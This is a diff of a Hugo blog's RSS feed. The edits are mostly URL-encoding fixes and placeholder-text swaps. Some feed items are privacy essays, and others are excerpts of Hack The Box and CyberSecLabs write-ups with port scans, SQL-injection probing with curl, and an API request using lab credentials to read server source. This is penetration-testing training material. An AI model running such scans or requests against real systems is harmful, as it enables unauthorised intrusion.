@@ -1,19 +1,19 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Posts on Poney Island</title>
-        <link>https://0xade1.github.io/$DEV_BASEURL/posts/</link>
+        <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/</link>
         <description>Recent content in Posts on Poney Island</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <lastBuildDate>Wed, 29 Sep 2021 10:05:52 +0800</lastBuildDate>
-        <atom:link href="https://0xade1.github.io/$DEV_BASEURL/posts/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
             <title>Social Media Dont Care for Your Privacy</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/social-media-dont-care-for-your-privacy/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/social-media-dont-care-for-your-privacy/</link>
             <pubDate>Wed, 29 Sep 2021 10:05:52 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/social-media-dont-care-for-your-privacy/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/social-media-dont-care-for-your-privacy/</guid>
             <description>The Maslow pyramid
 Social Media lures you to believe they care for your wellness Over the years, Social Media has hired Neuroscientists to make their platform so addictive that the psychological needs has been revisited and took priority over Security and safety. How secure and how private is our data matters less then our perception of privacy and security; and therefore while we focus less in Digital Safety then our needs for digital social interaction, social media invests more into Public Relationship, lawyers, marketing and lobbyist to secure their reputation.</description>
             <content type="html"><![CDATA[<p><strong>The Maslow pyramid</strong></p>
@@ -63,10 +63,10 @@ you navigation towards content that fits your interests.</p>
         
         <item>
             <title>Are Privacy Laws a Joke About Privacy?</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/are-privacy-laws-a-joke-about-privacy/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/are-privacy-laws-a-joke-about-privacy/</link>
             <pubDate>Wed, 29 Sep 2021 05:32:17 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/are-privacy-laws-a-joke-about-privacy/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/are-privacy-laws-a-joke-about-privacy/</guid>
             <description>You dont read Terms and Conditions of services you use  Let&amp;rsquo;s face the reality, you can&amp;rsquo;t read 20 min of Terms and Conditions in 2 seconds every website or services you visit
  Have you actually, once in your life, seriously read one with all the attention it deserves to fully understand at which extent your privacy is at stake? I did it couple of times before I realized how vain effort it was.</description>
             <content type="html"><![CDATA[<h2 id="you-dont-read-terms-and-conditions-of-services-you-use">You dont read Terms and Conditions of services you use</h2>
@@ -88,8 +88,8 @@ you navigation towards content that fits your interests.</p>
 <p>This is even more obvious on mobile applications at every single Android or iOS update, you have to accept and can&rsquo;t refuse unless you want to stay exposed with unpatched critical vulnerabilities that may expose your data even more. You have to accept Instagram or Whatsapp new terms or you will progressively or immediately loose the whole or part of the service: a pop-up will harass you and show-up every time the app is being used until you finally click (often by accident) on the <code>OK</code> button. Impossible trade-off to compromise security for privacy, I&rsquo;ll loose both if I choose this path &hellip;</p>
 <h2 id="should-i-approve-everything-or-refrain-from-using-it">Should I approve everything or refrain from using it</h2>
 <p>You may disagree a single term or a unique condition among hundreds, well in this case, we can say that you have the right not to use this services? After all those are private business that offers you a service, sometimes without a Premium, and therefore they have the right to force your consent into approving every single of their hundreds of terms? Silly of me, we don&rsquo;t have all the same reasons and incentives (not) to use a certain service, so there is no single right answer and each of us <strong>HAVE TO</strong> abide and accept every single terms to use those services, unless we want to be a social media hermit.</p>
-<p>In fact this is not a real choice, it is rather <strong>an extorsion of consent</strong> in a form of forcing you to make a compromise between what you think is deemed acceptable vs what is not acceptable, and therefore it is all about the perceived value of the service. How does <code>Acceptance</code> of the unacceptable hurts you less or more then the need or satisfaction of enjoying this service? It is commonly established that human beings are social &ldquo;animals&rdquo; and that The Needs for social interaction is among the most prominent in the <strong><a href="https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/social-media-dont-care-for-your-privacy/">Maslow pyramid</a></strong>. The telephone, the internet were once limited to an elite before it got considered as <strong>first necessity</strong> services that should be guaranteed by governments; in the same manner and without falling into communism, the right to access social media services and exercise free-speech without being shutdown or erased because of the shareholder or executive ideology of the moment, should be a right guaranteed by governments and ruled by law where only a judge can decide to conceal or delete your content.</p>
-<p>Youngest generation from the 2000s never had a digital privacy and lack of safety education or awareness that <a href="https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/social-media-dont-care-for-your-privacy/">social media aims to make money more then they care for our wellness</a>**. The telephone, the internet were once limited to an elite before it got considered as **first necessity** services that should be guaranteed by governments; in the same manner and without falling into communism, the right to access social media services and exercise free-speech without being shutdown or erased because of the shareholder or executive ideology of the moment, should be a right guaranteed by governments and ruled by law where only a judge can decide to conceal or delete your content., they were born in a period of explosion of social media where everything has to be shared, and our teenagers are very sensitive to social code and pressure to be followed.</p>
+<p>In fact this is not a real choice, it is rather <strong>an extorsion of consent</strong> in a form of forcing you to make a compromise between what you think is deemed acceptable vs what is not acceptable, and therefore it is all about the perceived value of the service. How does <code>Acceptance</code> of the unacceptable hurts you less or more then the need or satisfaction of enjoying this service? It is commonly established that human beings are social &ldquo;animals&rdquo; and that The Needs for social interaction is among the most prominent in the <strong><a href="https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/social-media-dont-care-for-your-privacy/">Maslow pyramid</a></strong>. The telephone, the internet were once limited to an elite before it got considered as <strong>first necessity</strong> services that should be guaranteed by governments; in the same manner and without falling into communism, the right to access social media services and exercise free-speech without being shutdown or erased because of the shareholder or executive ideology of the moment, should be a right guaranteed by governments and ruled by law where only a judge can decide to conceal or delete your content.</p>
+<p>Youngest generation from the 2000s never had a digital privacy and lack of safety education or awareness that <a href="https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/social-media-dont-care-for-your-privacy/">social media aims to make money more then they care for our wellness</a>**. The telephone, the internet were once limited to an elite before it got considered as **first necessity** services that should be guaranteed by governments; in the same manner and without falling into communism, the right to access social media services and exercise free-speech without being shutdown or erased because of the shareholder or executive ideology of the moment, should be a right guaranteed by governments and ruled by law where only a judge can decide to conceal or delete your content., they were born in a period of explosion of social media where everything has to be shared, and our teenagers are very sensitive to social code and pressure to be followed.</p>
 <p>We are litterally replacing the 90s generation of privacy-minded people borned with a wild and free internet with a new generation of young people unaware of the importance of protecting and keeping control on their private information, as well as not delegating their security and privacy to companies they should protect themselves from: I perceive this generation as too easily consenting to approve everything and very prone to leak very private information that could be used by governments, private companies, or &ldquo;friends&rdquo; into coercing them to do what they will otherwise be reluctant to approve.</p>
 <h2 id="a-pact-with-the-devil-you-cant-sign-out">A pact with the devil you can&rsquo;t sign-out?</h2>
 <blockquote>
@@ -114,18 +114,18 @@ you navigation towards content that fits your interests.</p>
         
         <item>
             <title>Test3</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/test3/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/test3/</link>
             <pubDate>Sun, 26 Sep 2021 20:32:30 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/test3/</guid>
-            <description>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</description>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/test3/</guid>
+            <description>Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl. Nulla sodales malesuada ornare. Aenean suscipit, erat at suscipit feugiat, massa lorem scelerisque enim, non sodales est lacus sit amet velit. Phasellus gravida nulla ut dictum mollis. Aliquam interdum porta turpis, sed bibendum nunc aliquam a. Cras et porta ante. Curabitur eget purus nulla.</description>
             <content type="html"><![CDATA[
 
 
 
 
 
-  <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
+  <p><em>Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl. Nulla sodales malesuada ornare. Aenean suscipit, erat at suscipit feugiat, massa lorem scelerisque enim, non sodales est lacus sit amet velit. Phasellus gravida nulla ut dictum mollis. Aliquam interdum porta turpis, sed bibendum nunc aliquam a. Cras et porta ante. Curabitur eget purus nulla. Praesent sit amet interdum tortor. Nunc vestibulum ullamcorper velit a commodo. Fusce tincidunt rhoncus iaculis. Nullam vel egestas sem. Morbi eget sagittis felis. Morbi faucibus consequat elementum.</em></p>
 
 
 
@@ -134,10 +134,10 @@ you navigation towards content that fits your interests.</p>
         
         <item>
             <title>How I built this privacy friendly blog</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/how-i-built-this-privacy-friendly-blog/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/how-i-built-this-privacy-friendly-blog/</link>
             <pubDate>Sun, 26 Sep 2021 11:28:33 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/how-i-built-this-privacy-friendly-blog/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/how-i-built-this-privacy-friendly-blog/</guid>
             <description>Why I built this blog Social Media dominant ideology is corrupting people thoughts In an increasingly manicheist world loosing its sense of shades and scales of Tolerance towards extremes sides, I found difficult to publicly express my view of facts and events that may contradicts dominant ideology. I was looking for a way to post my opinions and thoughts online while avoiding the new norm of social media pressure that systematically judges you according to some political prism or psychological bias.</description>
             <content type="html"><![CDATA[<h2 id="why-i-built-this-blog">Why I built this blog</h2>
 <h3 id="social-media-dominant-ideology-is-corrupting-people-thoughts">Social Media dominant ideology is corrupting people thoughts</h3>
@@ -1379,10 +1379,10 @@ Feel free to make it your own, as I would love to see your site with my preferre
         
         <item>
             <title>HTB - Sink</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-sink/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-sink/</link>
             <pubDate>Mon, 20 Sep 2021 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-sink/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-sink/</guid>
             <description>nmap 1 2 3 4 5  sudo nmap -p- --min-rate=3000 10.10.10.225 -v PORT STATE SERVICE 22/tcp open ssh 3000/tcp open ppp 5000/tcp open upnp   port 3000/TCP Gitea 1.12.6 which is above vulnerable version in searchsploit
 Exploration finds:
  3 users: marcus, david and root 1 organization:: Sink_Solutions  port 5000/TCP There is a R
@@ -2135,10 +2135,10 @@ Cw<span style="color:#ff79c6">==</span>
         
         <item>
             <title>HTB - Validation</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-validation/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-validation/</link>
             <pubDate>Sun, 19 Sep 2021 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-validation/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-validation/</guid>
             <description>TCP port 80 Detect SQL Injection Using curl -i -vvv we can see there is redirection (code 302) with a Set-Cookies header in the response; We have to use curl -L -b cookies.txt to save the cookie in a file and follow redirection
 1  curl -L -b cookiest.txt &amp;#39;http://10.10.11.116/#&amp;#39; -H &amp;#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0&amp;#39; -H &amp;#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8&amp;#39; -H &amp;#39;Accept-Language: en-GB,en;q=0.5&amp;#39; --compressed -H &amp;#39;Referer: http://10.</description>
             <content type="html"><![CDATA[<h1 id="tcp-port-80">TCP port 80</h1>
@@ -2284,10 +2284,10 @@ cat /home/htb/user.txt
         
         <item>
             <title>HTB - Unobtainium</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-unobtainium/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-unobtainium/</link>
             <pubDate>Sat, 11 Sep 2021 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-unobtainium/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-unobtainium/</guid>
             <description>1 2 3  curl -s -X $&amp;#39;POST&amp;#39; http://unobtainium.htb:31337/todo \ -H $&amp;#39;Content-Type: application/json&amp;#39; \ -d &amp;#39;{&amp;#34;auth&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;felamos&amp;#34;, &amp;#34;password&amp;#34;: &amp;#34;Winter2021&amp;#34;}, &amp;#34;filename&amp;#34; : &amp;#34;index.js&amp;#34;}&amp;#39; | jq -r &amp;#39;.content&amp;#39;   output:
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97  var root = require(&amp;#34;google-cloudstorage-commands&amp;#34;); const express = require(&amp;#34;express&amp;#34;); const { exec } = require(&amp;#34;child_process&amp;#34;); const bodyParser = require(&amp;#34;body-parser&amp;#34;); const _ = require(&amp;#34;lodash&amp;#34;); const app = express(); var fs = require(&amp;#34;fs&amp;#34;); const users = [ { name: &amp;#34;felamos&amp;#34;, password: &amp;#34;Winter2021&amp;#34; }, { name: &amp;#34;admin&amp;#34;, password: Math.</description>
             <content type="html"><![CDATA[<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -3474,10 +3474,10 @@ root@unobtainium:~#
         
         <item>
             <title>HTB - CrossFitTwo</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-crossfittwo/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-crossfittwo/</link>
             <pubDate>Fri, 10 Sep 2021 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-crossfittwo/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-crossfittwo/</guid>
             <description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  sudo nmap -p22,80,8953 --min-rate 10000 -v 10.10.10.232 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8953/tcp open ub-dns-control sudo nmap -p 22,80,8953 -sCV 10.10.10.232 sudo nmap -p22,80,8953 -sCV 10.10.10.232 Starting Nmap 7.</description>
             <content type="html"><![CDATA[<h2 id="nmap">nmap</h2>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -4943,10 +4943,10 @@ TP: POST /xxxemployees.crossfit.htb/test HTTP/1.12
         
         <item>
             <title>HTB - Gobox</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-gobox/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-gobox/</link>
             <pubDate>Sat, 04 Sep 2021 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-gobox/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-gobox/</guid>
             <description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  nmap -v -p- --min-rate=5000 -T4 10.10.11.113 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 4566/tcp open kwtc 8080/tcp open http-proxy nmap -p22,80,4566,8080 -sC -sV 10.10.11.113 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx |\_http-title: Hacking eSports | {{.Title}} 4566/tcp open http nginx |\_http-title: 403 Forbidden 8080/tcp open http nginx |\_http-title: Hacking eSports | Home page Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   gobuster 1  gobuster dir -u http://10.</description>
             <content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -5363,10 +5363,10 @@ touch /tmp/iptables-set
         
         <item>
             <title>HTB - Knife</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-knife/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-knife/</link>
             <pubDate>Fri, 03 Sep 2021 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-knife/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-knife/</guid>
             <description>nmap nmap -v -p- --min-rate 5000 10.10.10.242 nmap -p22,80 -sC -sV 10.10.10.242 [..] PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e🆎22:0e:c0:ee (ECDSA) |\_ 256 1a🇩🇪a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |\_http-server-header: Apache/2.4.41 (Ubuntu) |\_http-title: Emergent Medical Idea Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel sudo nmap -p80 --script=vuln 10.10.10.242 no known vulnerabilities for the above</description>
             <content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
 <pre tabindex="0"><code>nmap -v -p- --min-rate 5000 10.10.10.242
@@ -5498,10 +5498,10 @@ cat /root/root.txt
         
         <item>
             <title>CSL - Office</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/08/csl-office/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/08/csl-office/</link>
             <pubDate>Sun, 22 Aug 2021 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/08/csl-office/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/08/csl-office/</guid>
             <description>Exploration nmap -p- -sC -sV -T4 -v 172.31.3.1 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) gobugobuster dir -u http://172.31.3.1 -w /opt/dictionaries/directory-list-2.3-medium.txt /wp-content (Status: 301) /wp-includes (Status: 301) /wp-admin(Status: 301) gobuster dir -k -u https://172.31.3.1 -w /opt/dictionaries/directory-list-2.3-medium.txt /forum (Status: 301) /wordpress (Status: 301) Exploring the /forum, we find possible file inclusion link and indeed: https://172.</description>
             <content type="html"><![CDATA[<h1 id="exploration">Exploration</h1>
 <pre tabindex="0"><code>nmap -p- -sC -sV -T4 -v 172.31.3.1
@@ -5876,10 +5876,10 @@ root@office:~# cat system.txt
         
         <item>
             <title>CSL - Shares</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/08/csl-shares/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/08/csl-shares/</link>
             <pubDate>Sun, 22 Aug 2021 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/08/csl-shares/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/08/csl-shares/</guid>
             <description>Exploration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  nmap -p1-65535 -T4 -v 172.31.1.7 nmap -p21,80,11227,27853,35327,39857,48167,48201,49423 -A -T4 172.31.1.7 Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-21 14:36 HKT Nmap scan report for 172.31.1.7 Host is up (0.30s latency). PORT STATE SERVICE VERSION 11227/tcp closed unknown 27853/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f (RSA) | 256 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 (ECDSA) |_ 256 cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 (ED25519) 35327/tcp open nlockmgr 1-4 (RPC #100021) 39857/tcp open mountd 1-3 (RPC #100005) 48167/tcp closed unknown 48201/tcp open mountd 1-3 (RPC #100005) 49423/tcp open mountd 1-3 (RPC #100005)   Install and run showmount</description>
             <content type="html"><![CDATA[<h1 id="exploration">Exploration</h1>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -6090,10 +6090,10 @@ system.txt
         
         <item>
             <title>CSL - Zero</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/08/csl-zero/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/08/csl-zero/</link>
             <pubDate>Sun, 22 Aug 2021 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/08/csl-zero/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/08/csl-zero/</guid>
             <description>Exploration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  sudo nmap 172.31.1.29 Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-21 22:27 HKT Nmap scan report for 172.31.1.29 Host is up (0.10s latency). Not shown: 988 filtered ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server Nmap done: 1 IP address (1 host up) scanned in 19.</description>
             <content type="html"><![CDATA[<h1 id="exploration">Exploration</h1>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -6344,18 +6344,18 @@ C:\Users\jared\Desktop&gt;type Access.txt
         
         <item>
             <title>Vim as a first choice Python IDE</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/02/vim-as-a-first-choice-python-ide/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/02/vim-as-a-first-choice-python-ide/</link>
             <pubDate>Thu, 11 Feb 2021 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/02/vim-as-a-first-choice-python-ide/</guid>
-            <description>Nam quam ante, faucibus id dolor eget, scelerisque congue justo. Sed sit amet cursus metus, sed convallis mauris. Vestibulum lobortis volutpat libero maximus faucibus. Vivamus eleifend placerat ipsum, nec tempor tellus placerat sit amet. Proin ac velit at nulla ultrices tempor non ac sem. Morbi volutpat justo non augue imperdiet lacinia. Sed dui ipsum, viverra quis tincidunt vitae, sodales nec est. Maecenas ac nibh consequat, venenatis purus ullamcorper, porttitor mauris.</description>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/02/vim-as-a-first-choice-python-ide/</guid>
+            <description>Proin sit amet libero eleifend, eleifend eros ut, imperdiet mauris. Nam at massa nec lectus tempus ullamcorper ut id odio. Cras finibus lectus sit amet enim congue dictum. Phasellus malesuada sollicitudin metus non tincidunt. Vivamus purus quam, accumsan nec neque sed, aliquam suscipit nibh. Etiam blandit viverra lectus, ac rutrum mauris interdum sit amet. Curabitur mollis sem at accumsan dapibus. Nulla vel dolor elementum, pharetra metus cursus, gravida velit. Ut eget dolor vel risus molestie venenatis non sit amet ipsum.</description>
             <content type="html"><![CDATA[
 
 
 
 
 
-  <p><em>Nam quam ante, faucibus id dolor eget, scelerisque congue justo. Sed sit amet cursus metus, sed convallis mauris. Vestibulum lobortis volutpat libero maximus faucibus. Vivamus eleifend placerat ipsum, nec tempor tellus placerat sit amet. Proin ac velit at nulla ultrices tempor non ac sem. Morbi volutpat justo non augue imperdiet lacinia. Sed dui ipsum, viverra quis tincidunt vitae, sodales nec est. Maecenas ac nibh consequat, venenatis purus ullamcorper, porttitor mauris. Nulla elementum sem eget tortor fermentum malesuada. Integer pretium felis sem, in tincidunt nibh elementum sit amet. Donec nec orci iaculis, interdum est non, sodales est. Suspendisse pulvinar, ante sed elementum feugiat, mauris turpis blandit eros, egestas pretium risus nisl mattis urna. Integer sed urna turpis. Quisque auctor ac elit id imperdiet. Vivamus sed tortor semper, tempus ipsum sed, auctor nibh. Fusce sit amet facilisis tellus.</em></p>
+  <p><em>Proin sit amet libero eleifend, eleifend eros ut, imperdiet mauris. Nam at massa nec lectus tempus ullamcorper ut id odio. Cras finibus lectus sit amet enim congue dictum. Phasellus malesuada sollicitudin metus non tincidunt. Vivamus purus quam, accumsan nec neque sed, aliquam suscipit nibh. Etiam blandit viverra lectus, ac rutrum mauris interdum sit amet. Curabitur mollis sem at accumsan dapibus. Nulla vel dolor elementum, pharetra metus cursus, gravida velit. Ut eget dolor vel risus molestie venenatis non sit amet ipsum.</em></p>
 
 
 
@@ -6453,18 +6453,18 @@ brew install &ndash;with-jansson &ndash;HEAD universal-ctags/universal-ctags</p>
         
         <item>
             <title>Test</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/02/test/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/02/test/</link>
             <pubDate>Sun, 07 Feb 2021 13:45:14 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/02/test/</guid>
-            <description>Proin sit amet libero eleifend, eleifend eros ut, imperdiet mauris. Nam at massa nec lectus tempus ullamcorper ut id odio. Cras finibus lectus sit amet enim congue dictum. Phasellus malesuada sollicitudin metus non tincidunt. Vivamus purus quam, accumsan nec neque sed, aliquam suscipit nibh. Etiam blandit viverra lectus, ac rutrum mauris interdum sit amet. Curabitur mollis sem at accumsan dapibus. Nulla vel dolor elementum, pharetra metus cursus, gravida velit. Ut eget dolor vel risus molestie venenatis non sit amet ipsum.</description>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/02/test/</guid>
+            <description>Sed consectetur enim non erat mattis pretium. Morbi faucibus tellus ac ipsum molestie, ac sagittis ligula molestie. Mauris sed placerat elit. Ut eleifend dolor odio. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Sed dapibus porttitor tortor eu venenatis. Donec lacus mi, rhoncus nec iaculis condimentum, maximus nec ipsum. Aliquam eu nisl commodo, varius ligula eu, faucibus dui.</description>
             <content type="html"><![CDATA[
 
 
 
 
 
-  <p><em>Proin sit amet libero eleifend, eleifend eros ut, imperdiet mauris. Nam at massa nec lectus tempus ullamcorper ut id odio. Cras finibus lectus sit amet enim congue dictum. Phasellus malesuada sollicitudin metus non tincidunt. Vivamus purus quam, accumsan nec neque sed, aliquam suscipit nibh. Etiam blandit viverra lectus, ac rutrum mauris interdum sit amet. Curabitur mollis sem at accumsan dapibus. Nulla vel dolor elementum, pharetra metus cursus, gravida velit. Ut eget dolor vel risus molestie venenatis non sit amet ipsum.</em></p>
+  <p><em>Sed consectetur enim non erat mattis pretium. Morbi faucibus tellus ac ipsum molestie, ac sagittis ligula molestie. Mauris sed placerat elit. Ut eleifend dolor odio. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Sed dapibus porttitor tortor eu venenatis. Donec lacus mi, rhoncus nec iaculis condimentum, maximus nec ipsum. Aliquam eu nisl commodo, varius ligula eu, faucibus dui.</em></p>
 
 
 
